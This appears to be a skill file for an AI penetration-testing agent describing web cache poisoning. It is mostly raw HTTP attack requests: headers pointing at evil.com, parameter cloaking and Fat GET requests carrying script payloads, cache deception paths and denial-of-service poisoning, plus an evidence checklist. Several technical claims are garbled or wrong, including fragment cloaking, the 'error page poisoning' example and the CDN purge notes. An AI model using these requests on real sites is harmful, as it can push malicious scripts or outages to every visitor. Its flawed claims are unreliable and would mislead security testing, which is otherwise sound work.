---
name: cache-poisoning
description: "Web Cache Poisoning exploitation using unkeyed headers, parameter Cloaking, and CDN-specific techniques"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, measureTiming, compareResponses, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["cache poisoning", "web cache poisoning", "cdn poisoning", "cache deception", "unkeyed header", "cache poisoning dos", "cache key manipulation", "vary header bypass", "cache投毒", "cache attack"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1499"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

## 1. When to Use / Do Not Use

### Use Web Cache Poisoning when:
- Target sits behind a CDN or reverse proxy (Cloudflare, Akamai, Varnish, Nginx, Fastly, AWS CloudFront)
- You observe `X-Cache`, `CF-Cache-Status`, `X-Varnish`, `Age` headers indicating caching layer
- Target reflects request parameters or headers in responses (XSS, header injection)
- Target uses `Cache-Control`, `Expires`, or `ETag` headers on user-facing pages
- You need to escalate a reflected vulnerability to affect all users via cache poisoning
- Target has `Vary` headers with inconsistent cache/backend interpretation
- You need to amplify impact: one poisoned cache entry → many victims

### Do NOT use when:
- Target has no visible caching layer (no cache headers, no CDN fingerprints)
- All responses have `Cache-Control: no-store` or `no-cache` consistently
- Target only serves authenticated/dynamic content with `Vary: Cookie` or `Authorization`
- Cache key includes all distinguishing parameters and header variations
- CDN enforces strict cache key rules with no unkeyed inputs
- You have no ability to observe cache behavior (no response headers, no timing signals)

### Quick Decision Tree:
```
Is there a caching layer?
├── No → Standard web attack path, not cache poisoning
├── Yes → Can you control unkeyed inputs?
│   ├── No → Cache poisoning unlikely, assess other vectors
│   └── Yes → Map cache behavior → test unkeyed headers → test parameter cloaking
│       └── Validate: Did your change persist to other users?
```

## 2. Auth Context

### Cache Poisoning Authentication Requirements:
- **Anonymous pages** (homepage, search, public product pages): Full cache poisoning surface — any visitor can poison and any visitor receives poisoned content
- **Authenticated pages**: Cache poisoning only affects users with matching `Cookie` or `Authorization` if those headers are part of cache key. If they are NOT keyed, poisoning affects all users including authenticated ones — high impact
- **Login-required content**: Typically not cached. If it IS cached, it's a critical misconfiguration exposing PII via cache poisoning
- **CDN-level auth**: Some CDNs cache authenticated content (API responses, personalized pages). Check if `Authorization` is in the cache key. If not, poisoned cached responses can leak tokens or session data

### Auth-Aware Poisoning Strategy:
```
1. Check if Cookie/Authorization header appears in cache key
2. If NOT keyed → Poison affects ALL users (critical impact)
3. If keyed → Poison only affects users with matching auth state
4. Test with unauthenticated request first → verify poisoned response persists
5. Then test authenticated → verify if auth headers create separate cache bucket
```

### Impact Assessment:
| Auth State | Cache Key Includes Auth? | Poisoning Impact |
|---|---|---|
| Public page | N/A | All visitors |
| Auth page, auth NOT in key | High | All users get poisoned auth content |
| Auth page, auth IN key | Low | Only users with same session state |
| API with API key in key | None | Poisoning not possible via cache |

## 3. Cache Detection

### CDN / Proxy Identification:

**Response Headers to Inspect:**
| Header | CDN/Proxy | Meaning |
|--------|-----------|---------|
| `CF-Cache-Status` | Cloudflare | HIT, MISS, DYNAMIC, EXPIRED, BYPASS |
| `X-Cache` | Varnish / Nginx | HIT, MISS, EXPIRED, BYPASS |
| `X-Varnish` | Varnish | Numeric IDs (request/ cache hit) |
| `X-Cache-Hits` | Fastly | HIT count |
| `X-Served-By` | Fastly | Cache node ID |
| `Via` | Generic proxy | Proxy identifier string |
| `X-CDN` | Various | CDN provider name |
| `Server` | Various | `cloudflare`, `AkamaiGHost`, `Varnish`, `nginx/1.x` |
| `Age` | Any caching proxy | Seconds since cached response was generated |
| `X-Check` | Akamai | Cache check result |

**Timing-Based Cache Detection:**
1. Send same request twice with unique identifier in unkeyed parameter
2. First response: `X-Cache: MISS`, `Age: 0`
3. Second response: `X-Cache: HIT`, `Age: <seconds>`
4. Difference confirms caching is active

**Cache Key Mapping:**
1. Send request with unique query parameter: `?cache_test_unique_12345`
2. Check if second request to same URL without that parameter returns cached response
3. If yes, query param is NOT in cache key
4. Repeat with different headers (`Accept-Language`, `User-Agent`, `X-Forwarded-For`) to identify keyed vs unkeyed headers

### Cacheability Rules to Test:
```
# Test 1: Default cacheability
GET /test-cache?unique=1 → Check X-Cache header

# Test 2: POST vs GET
POST /test-cache → GET /test-cache → Compare

# Test 3: Response status code
GET /nonexistent → Check if 404 is cached

# Test 4: Response headers
GET /with-set-cookie → Check if cached despite Set-Cookie

# Test 5: Content-Type
GET /test.css → GET /test.js → Check caching per content type
```

## 4. Unkeyed Headers

### Commonly Unkeyed Headers:

**`X-Forwarded-Host`** — Poisons cache with attacker-controlled Host header:
```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If backend uses X-Forwarded-Host for link generation:
# Cached response contains links to evil.com
# All users receiving cached page get redirected or load resources from evil.com
```

**`X-Original-URL`** / **`X-Rewrite-URL`** — Access restricted paths:
```
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Backend may serve /admin content while cache stores it for /
# Poison cache with admin page content at root URL
```

**`X-HTTP-Method-Override`** — Change request semantics:
```
GET / HTTP/1.1
X-HTTP-Method-Override: POST
Content-Type: application/x-www-form-urlencoded

action=delete&id=123

# Backend processes as POST, cache stores GET response
# Poison cache with POST-handled content
```

**`X-Forwarded-For`** — IP-based cache key bypass:
```
GET /page HTTP/1.1
X-Forwarded-For: 127.0.0.1

# If X-Forwarded-For not in cache key but backend uses it for geo-personalization
# Cache stores personalized content for non-personalized key
```

### Unkeyed Header Discovery Methodology:
1. Send request, note response headers and body
2. Add `X-Forwarded-Host: evil.com`, resend
3. Compare responses — if body differs, header is unkeyed and affects backend
4. Check if new response is cached (send original request again, compare)
5. Repeat for `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`, `X-Forwarded-For`, `X-Original-Remote-Addr`

## 5. Parameter Cloaking

### Semicolon Cloaking Technique:
When cache uses query string splitting on `&` but backend splits on `;`:
```
# Cache key sees: utm_content=x (unique, cache miss)
# Backend sees: utm_content=x AND callback=alert(1)

GET /page?utm_content=x;callback=alert(1) HTTP/1.1

# Cache stores response under key: /page?utm_content=x
# Backend reflects callback=alert(1) in response
# Second request to /page?utm_content=x returns poisoned XSS response
```

### Fragment Cloaking:
```
# Cache ignores fragment (#), backend processes it
GET /search#q=<script>alert(1)</script> HTTP/1.1

# Or with fragment before parameters
GET /page? legitimate=1#<script>alert(1)</script>
```

### Parameter Pollution as Cloaking:
```
# Duplicate parameter — cache takes first, backend takes second
GET /page?search=test&search=<script>alert(1)</script> HTTP/1.1

# Cache key: /page?search=test
# Backend uses second value: <script>alert(1)</script>
```

### Path Parameter Cloaking:
```
# Some backends parse path parameters, caches don't
GET /page.js;callback=alert(1) HTTP/1.1

# Cache sees: /page.js
# Backend sees: /page.js with callback parameter
```

### Parameter Cloaking Detection:
1. Identify parameters reflected in response (source: `parseResponse`)
2. Test semicolon injection: `?legit=1;reflected= payload`
3. Test parameter pollution: `?param=legit&param=payload`
4. Test path parameters: `/page;payload` or `/page,payload`
5. Check if cache key differs from backend parameter parsing
6. Verify with timing: `measureTiming` shows cache hit for cloaked request

## 6. Fat GET

### Concept:
Convert a POST request (with body) into a GET request that gets cached. The cache stores the POST-handled response under a GET key.

### Transfer-Encoding Technique:
```
GET / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 0

0

<script>alert(1)</script>

# Chunked encoding: cache sees end-of-headers at "0\r\n\r\n"
# Backend sees additional body content after chunked terminator
# Cache stores this as GET /, backend processes with body
```

### HTTP/1.0 Smuggling:
```
GET / HTTP/1.0
Host: target.com
Content-Type: application/x-www-form-urlencoded

<script>alert(1)</script>

# HTTP/1.0 may not require Content-Length
# Backend processes body, cache does not include it in key
```

### Fat GET Detection:
1. Send POST with body that triggers different behavior than GET
2. Convert to GET with same body content
3. Check if response differs (backend processed body)
4. Check if response is cached (X-Cache: HIT on second request)
5. Verify Fat GET affects cache key correctly

### Fat GET to XSS:
```
# Step 1: Identify POST endpoint that reflects input
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "test"}

# Step 2: Convert to Fat GET
GET /api/search HTTP/1.1
Content-Type: application/json
Content-Length: 22

{"query": "<script>alert(1)</script>"}

# Step 3: Verify cache stores this
# Step 4: All GET /api/search requests now receive XSS
```

## 7. Normalization Bypass

### Case Normalization Differences:
```
# Backend normalizes, cache does not
GET /admin HTTP/1.1 → X-Cache: HIT (cached under /admin)
GET /Admin HTTP/1.1 → X-Cache: MISS (cache miss, but backend normalizes to /admin)

# Poison cache with /Admin content, serve at /admin key
# Or: backend serves /Admin content, cache stores under /admin
```

### Encoding Normalization:
```
# URL encoding differences
GET /page%20name HTTP/1.1   → Backend: /page name
GET /page%20name HTTP/1.1   → Cache: /page%20name (raw)

# Double encoding
GET /%252e%252e/%252e%252e/admin HTTP/1.1
# Backend decodes once: ../../admin → accesses admin
# Cache never decodes: stores as literal %252e%252e/...

# Unicode normalization
GET /pa\u0067e HTTP/1.1 → Backend: /page (Unicode normalized)
```

### Path Normalization:
```
# Trailing slash differences
GET /admin HTTP/1.1 vs GET /admin/ HTTP/1.1
# Backend may treat as same, cache stores separately

# Dot segment normalization
GET /./admin HTTP/1.1 → Backend: /admin
GET /./admin HTTP/1.1 → Cache: /./admin (literal)

# Double dot segments
GET /page/../../admin HTTP/1.1 → Backend: /admin
```

### Host Normalization:
```
# Port normalization
GET /page HTTP/1.1 with Host: target.com:80 → Backend: target.com
GET /page HTTP/1.1 with Host: target.com    → Cache: different key

# Case in host
GET /page HTTP/1.1 with Host: TARGET.COM → Backend: target.com (lowercase)
# Cache may create separate key for TARGET.COM
```

### Normalization Bypass Strategy:
1. Test case variations on URL path: `/admin`, `/Admin`, `/ADMIN`
2. Test encoding variations: `%2e`, `%2E`, `.` (dot), `%2f`, `/`
3. Test path parameters: `/page;1`, `/page;param=value`
4. Compare cache keys (timing analysis) with backend behavior (response content)
5. Find normalization discrepancy → poison cache with alternate form

## 8. Vary Header Bypass

### Vary Header Basics:
```
# Vary header tells cache which request headers affect the response
Vary: Accept-Encoding
# Cache stores separate versions for different Accept-Encoding values

Vary: *
# Cache never stores (every request unique)

Vary: Accept-Language, Cookie
# Cache stores per language+cookie combination
```

### Vary Header Exploitation:

**Vary: Accept-Encoding — Compression Mismatch:**
```
# Backend ignores Accept-Encoding, cache respects it
Request 1: Accept-Encoding: gzip
→ Cache stores under key: /page + gzip
→ Backend returns: <script>alert(1)</script> (no compression)

Request 2: Accept-Encoding: identity
→ Cache miss (different key)
→ Backend returns same response

# But if backend DOES compress for gzip:
Request 1: Accept-Encoding: gzip
→ Backend returns gzipped content
→ Cache stores gzipped version

Request 2: Accept-Encoding: identity
→ Cache miss, backend returns uncompressed
→ But: if cache key doesn't include Accept-Encoding → serves gzipped to identity clients → errors
```

**Vary: User-Agent — Browser-Specific Poisoning:**
```
# Poison cache for specific User-Agent
GET /page HTTP/1.1
User-Agent: Googlebot/2.1

# If Vary: User-Agent, cache stores under bot User-Agent key
# Only requests with same User-Agent receive poisoned content
# Useful for targeting: poison for Chrome, Firefox, Safari users separately
```

**Vary: Cookie — Auth Bypass via Cache:**
```
# If Vary: Cookie but cache ignores certain cookie values
# Send request with session_id=invalid
# Cache stores response under invalid session key
# All unauthenticated users receive cached content
```

### Vary Header Fingerprinting:
1. Send request, note `Vary` header in response
2. Re-send with modified value for each Vary-listed header
3. Compare `X-Cache` status: MISS = that header is in cache key
4. If MISS does not occur → header listed in Vary but NOT in cache key (vulnerability)
5. Exploit gap between declared Vary and actual cache key composition

## 9. Cache Deception

### Path Confusion:
```
# Backend ignores extension, cache respects it
GET /account.png HTTP/1.1

# Backend serves: /account page (sensitive content)
# Cache sees .png extension → caches the response
# Subsequent requests to /account.png get sensitive page content

# Common extensions for cache deception:
GET /account.png
GET /profile.jpg
GET /dashboard.css
GET /settings.js
GET /user.pdf
```

### Path Confusion Variants:

**Leading Dot Confusion:**
```
GET /account/.png HTTP/1.1
# Backend: /account (ignores .png after slash)
# Cache: /account/.png → may cache with key /account
```

**Null Byte Injection:**
```
GET /account%00.png HTTP/1.1
# Backend: /account (null byte terminates path)
# Cache: /account%00.png → caches response
```

**URL Parameter Confusion:**
```
GET /account?foo=bar.png HTTP/1.1
# Backend: /account (ignores query for routing)
# Cache: may key on /account?foo=bar.png → caches sensitive content
```

**Double Extension:**
```
GET /account.png.jpg HTTP/1.1
# Backend: /account (parses to first extension)
# Cache: /account.png.jpg → caches response
```

### Cache Deception Detection:
1. Identify endpoints returning sensitive content (`/account`, `/profile`, `/dashboard`)
2. Append common file extensions: `.png`, `.jpg`, `.css`, `.js`, `.svg`, `.gif`
3. Check if response has same body as original (backend ignores extension)
4. Check if response has `X-Cache: HIT` on second request
5. Verify `Content-Type` mismatch: HTML content served at `.png` path

### Cache Deception Impact:
- **Credential theft**: Poisoned `/account.png` steals cookies/session
- **Token leakage**: API tokens reflected in cached "image" responses
- **XSS amplification**: Malicious script cached at deceptive path
- **PII exposure**: User data cached at predictable URLs

## 10. Cache Poisoning to XSS

### Reflected XSS → Stored via Cache:

**Step 1: Identify reflection point**
```
GET /search?q=<script>alert(1)</script> HTTP/1.1
→ Response contains: <script>alert(1)</script> reflected in page
→ Check X-Cache: MISS (not cached yet)
```

**Step 2: Test cacheability of reflected request**
```
GET /search?q=legit HTTP/1.1
→ Response has X-Cache: MISS
GET /search?q=legit HTTP/1.1
→ Response has X-Cache: HIT
→ Confirmed: search endpoint is cacheable
```

**Step 3: Identify unkeyed input for cache key manipulation**
```
# Method A: Parameter cloaking
GET /search?q=legit;payload=<script>alert(1)</script> HTTP/1.1
→ Cache key: /search?q=legit
→ Backend processes: q=legit AND payload=<script>alert(1)</script>
→ Response with XSS cached under /search?q=legit

# Method B: Unkeyed header
GET /search?q=legit HTTP/1.1
X-Forwarded-Host: evil.com
→ If backend reflects X-Forwarded-Host in script src
→ Cached response loads scripts from evil.com
```

**Step 4: Verify poisoning persistence**
```
GET /search?q=legit HTTP/1.1 (from different IP/client)
→ Response: X-Cache: HIT, contains XSS payload
→ All users visiting /search?q=legit receive XSS
```

### XSS via Cache Poisoning — Advanced Vectors:

**JSONP Endpoint Poisoning:**
```
# Backend has JSONP endpoint
GET /api/callback?data=legit HTTP/1.1
→ Response: legit({...})

# Poison with XSS payload
GET /api/callback?data=legit;callback=<script>alert(1)</script> HTTP/1.1
→ Cached response: <script>alert(1)</script>({...})
```

**CSS-Based XSS via Cache:**
```
# Poison CSS file in cache
GET /styles.css HTTP/1.1
X-Original-URL: /css/xss.css
→ Backend serves XSS CSS content
→ Cached under /styles.css
→ All users loading /styles.css get XSS CSS (behavioral CSS attacks)
```

## 11. Cache Poisoning DoS

### Redirect Loop Poisoning:
```
# Poison cache with redirect to non-existent endpoint
GET /poison-target HTTP/1.1
X-Original-URL: /nonexistent-page
→ Backend returns 404
→ Cache stores 404 response

# Or worse: redirect loop
GET /poison HTTP/1.1
X-Forwarded-Host: target.com
→ Backend returns 301 redirect to target.com/poison
→ Cache stores redirect
→ All users hitting /poison enter infinite redirect loop
```

### Error Page Poisoning:
```
# Poison cache with error page that prevents normal operation
GET /admin HTTP/1.1
X-Original-URL: /admin
X-Forwarded-For: 127.0.0.1
→ Backend serves admin page (privileged access via localhost)
→ Cache stores at /admin key
→ Normal users cannot access admin (get poisoned cache)
→ Admins cannot access admin (cache serves poisoned content)
```

### Resource Exhaustion via Cache:
```
# Poison cache with large response
GET /page HTTP/1.1
X-Forwarded-Host: attacker-controlled-domain.com
→ Backend fetches large resource from attacker domain
→ Cache stores large response
→ Every subsequent request downloads large payload
→ CDN bandwidth exhaustion
```

### Cache Poisoning DoS Detection:
1. Identify cacheable responses that affect user access
2. Poison with error conditions (404, 500, 503)
3. Poison with redirect loops
4. Verify persistence via timing analysis (`measureTiming`)
5. Assess blast radius: how many URLs affected, what user base impacted

## 12. CDN-Specific Techniques

### Cloudflare:
- **`CF-Cache-Status: DYNAMIC`**: Response not cached (dynamic content)
- **`CF-Cache-Status: BYPASS`**: Cache explicitly bypassed
- **`cf-cache-status`**: Lowercase variant also seen
- **Cache Key**: Includes scheme + host + URI + query string by default
- **Purge API**: `PURGE` request with API key clears cache
- **Workers**: Can manipulate cache behavior via `caches.default`
- **Specific vector**: Cloudflare may cache 404 responses if `Cache-Control` allows. Test with `X-Original-URL` to poison 404 cache

### Akamai:
- **`X-Cache: TCP_HIT`** / **`TCP_MISS`**: Akamai edge cache status
- **`X-Check-Cache-Key`**: Shows computed cache key
- **`Akamai-Request-ID`**: Request tracking
- **Specific vector**: Akamai may not include `X-Forwarded-Host` in cache key but backend processes it. Test `X-Original-URL` and `X-Rewrite-URL` for path-based cache poisoning
- **CachePurge**: `Fastly purge` equivalent for Akamai

### Varnish:
- **`X-Varnish: <id>`**: Numeric request/cache IDs
- **`X-Cache: HIT`** / **`MISS`**: Standard Varnish cache status
- **VCL Rules**: Cache key logic is configurable via Varnish Configuration Language
- **Specific vector**: Varnish may cache POST responses. Test Fat GET technique. VCL `hash` function determines cache key — inspect via `X-Varnish` header correlation

### Nginx (Proxy Cache):
- **`X-Cache-Status: HIT`** / **`MISS`** / **`EXPIRED`** / **`STALE`** / **`UPDATING`** / **`REVALIDATED`**
- **`Via: 1.1 nginx`**: Nginx reverse proxy identified
- **Specific vector**: Nginx `proxy_cache_key` often omits headers like `X-Forwarded-Host`. Test unkeyed header injection. Nginx may cache error responses (4xx, 5xx) — test error page poisoning

### Fastly:
- **`X-Served-By: cache-*`**: Fastly edge node
- **`X-Cache-Hits: <count>`**: Cache hit count
- **`Surrogate-Control`**: Fastly-specific cache control
- **Specific vector**: Fastly has `Surrogate-Key` for cache purging. Test if `Surrogate-Key` is user-controllable for selective cache invalidation

### AWS CloudFront:
- **`X-Cache: Hit from cloudfront`** / **`RefreshHit from cloudfront`**
- **`Via: 1.1 <id>.cloudfront.net (CloudFront)`**
- **Specific vector**: CloudFront `Cache-Control: s-maxage` override. If backend sets `s-maxage=0` but CloudFront ignores it, test cache key manipulation via `X-Forwarded-For` for geo-based cache bypass

### Multi-CDN Detection:
```
# Send request, check ALL response headers
# Identify CDN by Server header + specific cache headers
# Some targets use multiple CDN layers (primary + failover)
# Test each CDN layer independently — different cache key algorithms
```

## 13. Anti-Hallucination

### Common Hallucinations in Cache Poisoning — DO NOT CLAIM:

1. **"The cache is poisoned"** — ONLY claim if you verified with a SEPARATE request that received the poisoned response. `X-Cache: HIT` alone does not confirm poisoning — it means the response was cached, not that it's poisoned. You must send a clean request (without your attack parameters) and verify it returns your poisoned content.

2. **"This header is definitely unkeyed"** — ONLY claim after sending multiple requests with and without the header, comparing cache behavior across at least 3 requests. Single-request evidence is insufficient. Differences in response body may be due to backend behavior, not cache key exclusion.

3. **"All users will receive the poisoned content"** — ONLY claim after testing from a different context (different IP, User-Agent, Accept-Language) and confirming the same poisoned response is served. Some CDNs segment cache by geography or client characteristics.

4. **"The CDN is Varnish/Cloudflare/Akamai"** — ONLY claim if you see the specific identifying header. `Server: cloudflare` = Cloudflare. `X-Varnish` = Varnish. Do not guess CDN from response timing or behavior alone.

5. **"Parameter cloaking works with semicolon"** — ONLY claim after confirming: (a) the semicolon-separated parameter is reflected in response, (b) the cache key only includes the part before the semicolon, (c) the poisoned response persists on a clean follow-up request.

6. **"Cache poisoning affects authenticated users"** — ONLY claim after verifying that `Cookie` and `Authorization` headers are not part of the cache key. Test by sending poisoned request with and without auth headers, then checking if clean requests from different auth states receive poisoned content.

7. **"This is a Fat GET vulnerability"** — ONLY claim after confirming: (a) POST request with body produces different response than GET without body, (b) GET with body produces the POST-like response, (c) the GET response is cached (verified by `X-Cache: HIT` on follow-up).

8. **"The 404 error page is cached"** — ONLY claim if you received `X-Cache: HIT` on a request that returned 404 AND the response body matches your poisoned 404 content. A cached 200 response does not prove error page caching.

9. **"Cache deception is possible at this path"** — ONLY claim after confirming: (a) backend serves different content for the deceptive path (e.g., `/account.png` serves account page), (b) the response is actually cached (`X-Cache: HIT`), (c) the cached content is sensitive (not a static asset that happens to be at that path).

10. **"This CDN-specific technique works"** — ONLY claim after testing against the ACTUAL CDN the target uses. Varnish techniques do not apply to Cloudflare, and vice versa. Verify CDN identity from response headers first.

### Evidence Requirements for Cache Poisoning Findings:
- **Cache hit evidence**: `X-Cache: HIT` header from follow-up request (WITHOUT attack parameters)
- **Poisoning evidence**: Response body from clean request matches poisoned content
- **Persistence evidence**: Multiple clean requests from different contexts confirm poisoned content
- **Impact evidence**: Demonstrated XSS, redirect, or information disclosure via poisoned response
- **Scope evidence**: Number of affected URLs and estimated user base

### Verification Protocol:
```
# Step 1: Baseline
GET /target?clean=1 → Note response (X-Cache: MISS, original body)

# Step 2: Poison attempt
GET /target?clean=1;attack=payload → Note response (possibly different)

# Step 3: Verify poisoning
GET /target?clean=1 → X-Cache: HIT, body should contain attack payload

# Step 4: Verify persistence
GET /target?clean=1 (different User-Agent/IP) → Still poisoned?

# Step 5: Document evidence
- Screenshot/response of poisoned cache entry
- Screenshot/response of clean request returning poisoned content
- Timing evidence showing cache hit
```

### Evidence Capture Commands:
```
# Capture headers for cache detection
getCapturedHeaders → Response headers showing X-Cache, CF-Cache-Status, X-Varnish

# Record evidence of poisoning
recordEvidence → Cache hit headers + poisoned response body

# Write finding with cache poisoning details
writeFinding → Type: Cache Poisoning, Severity: High/Critical, Impact: XSS/DoS
```
